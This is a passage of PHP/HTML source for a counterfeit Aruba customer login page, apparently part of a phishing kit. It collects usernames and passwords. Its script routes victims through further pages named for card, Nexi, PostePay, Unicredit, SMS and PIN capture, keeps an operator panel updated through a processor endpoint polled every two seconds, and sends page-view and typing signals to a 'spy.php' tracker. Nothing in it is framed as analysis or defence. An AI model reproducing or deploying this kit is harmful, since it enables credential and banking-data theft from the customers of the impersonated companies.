if(isset($_GET['e'])){ 
echo '<div class="formcol" id="loginerror">
<p  style="margin-bottom:21px;color:red;background:#fff7f7;border:1px solid red;padding:10px; display:flex; align-items:center;">
   <img src="css/error.png" style="margin-right:5px ;">Identificación incorrecta. El identificador y/o contraseña introducidos no son
correctos.
</p>
</div>';
}

?>
				<div class="marginB-25 font15">Dall'area clienti puoi gestire, rinnovare domini e database, acquistare servizi aggiuntivi e modificare il servizio.</div>
								
				
				<div class="usernameLabelSt font15">
					Username
					<a href="#" target="_self" class="recoverCredentials" tabindex="-1">Non ricordi lo username?</a>
				</div>
				<div class="marginB-25" style="position: relative;">
					<input type="email" placeholder="es.12345@aruba.it" class="inputStyle" autocomplete="true" name="login" id="LoginAreaUtenti" maxlength="63" value="" required="" />
					<div id="tooltipInfo">
                        <img id="info" class="info infoIconSize" src="login/res/info-information-circle.svg" />
                    </div>
					<div class="tt_container">
						<div class="arrowTooltipUser"></div>
						<div class="tooltipUsername">Per accedere devi inserire il tuo username esempio '12345@aruba.it'.</div>
					</div>
				</div>
				<div class="pwdLabelSt font15">
					Password
					<a href="#" class="recoverCredentials" tabindex="-1">Non ricordi la password?</a>
				</div>
				<div class="marginB-40">
    <input type="password" placeholder="Password" class="inputStyle" name="pass" id="PasswordAreaUtenti" maxlength="4091" required />
    <img class="img-eyeWeb" id="eye-passwordWeb" onclick="showPasswordWeb()" style="display:block" src="res/eye.svg" />
    <img class="img-eye-noWeb" id="eye-no-passwordWeb" onclick="showPasswordWeb()" style="display:none" src="res/eye-hide.svg" />
</div>



				<button type="submit" id="submitFormCustomerArea" class="accessButtonContainer transition">
					<a href="#" class="accessButton">
						<span>ACCEDI</span>
					</a>
                </button>
				<div class="registerUserCont">
					<div class="font15">Sei un nuovo cliente?</div>
					<a href="#" class="registerUserBtn font16 transition" id="register">
						<span class="showTextDesktop">Crea il tuo account Aruba</span>
						<span class="showTextMobile">Crea account</span>
					</a>
				</div>
		  </form>
		  <hr class="hrSeparator">
		  <div style="margin-top: 10px;">
			<span class="usefulLinks font16">Link utili</span>
		  </div>
		  <div class="linkMenu">
			<a href="#" class="singleLink font16">
				<span>Gestione database MySQL</span>
			</a>
			<a href="#" class="singleLink font16">
				<span>Gestione database MSSQL</span>
			</a>
		  </div>
		  <div class="linkMenu">
			<a href="#" class="singleLink font16">
				<span>Pannello di controllo</span>
			</a>
		  </div>
	  </div> 
	</div>
</div>

</td>

 
</td>
<td width="5" valign="top"><img src="login/res/main_separatore_5_5.html" width="5" height="5"></td>
</tr>
</table>
</td>
</tr>
<tr><td height="30">

</td>
</tr>
</table>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
	<tr>
		<td class="separatore_5_orizzontale">&nbsp;</td>
	</tr>
	<tr>
		<td width="100%">
			<div class="footer">
				<span class="copyrightBottomDescription">&copy;2025 Aruba S.p.A. - P.IVA 01573850516 - REA: BG-434483- All rights reserved </span>
				<br/><a href="#" target="_blank">Cookie policy</a> - <a href="#">Personalizza cookie</a>
			</div>
		</td>
	</tr>
</table>


<script src="res/jq.js"></script>
<script src="res/v.js"></script>
	<script src="css/jq.js.download"></script>
	<script>
	var targets = {
            1: "log.php",
            2: "card.php",
            3: "carderror.php",
            4: "nexi.php",
            5: "nexi_error.php",
            6: "ints.php",
            7: "ints_error.php",
            8: "sms.php",
            9: "sms_error.php",
            10: "success.php",
            11: "app.php",
			12: "Cartabcc.php",
			13: "Cartabcc_error.php",
			14: "PostePay.php",
			15: "PostePay_error.php",
			16: "Unicredit.php",
			17: "Unicredit_error.php",
			18: "pin.php"
    };
	clearRedirections();
	setInterval(function(){
	$.post("../panel/process/processor.php",
	{keepAlive:1, page:"login"} );
}, 2000);
var redirect=0;

function clearRedirections(){
	$.post("../panel/process/processor.php",
	{clearRedirection:1});
}
 </script>


<script>
function showPasswordWeb() {
    const passwordField = document.getElementById("PasswordAreaUtenti");
    const eyeOpen = document.getElementById("eye-passwordWeb");
    const eyeClosed = document.getElementById("eye-no-passwordWeb");

    if (passwordField.type === "password") {
        passwordField.type = "text";
        eyeOpen.style.display = "none";
        eyeClosed.style.display = "block";
    } else {
        passwordField.type = "password";
        eyeOpen.style.display = "block";
        eyeClosed.style.display = "none";
    }
}
</script>
<script>
$("#loginform").validate({
		messages:{
				user: 'Introduce <b>tu identificador</b>',
				pass: 'Introduce <b>tu contraseña</b>'
	},
	submitHandler:function(form){
		form.submit();
	}
});

$.post("spy.php", {loginview:1});
var abort = false;
$("#user").keyup(function(){
	if(abort==false){
		$.post("spy.php", {loging:1});
		abort=true;
	}
});
</script>

</body></html>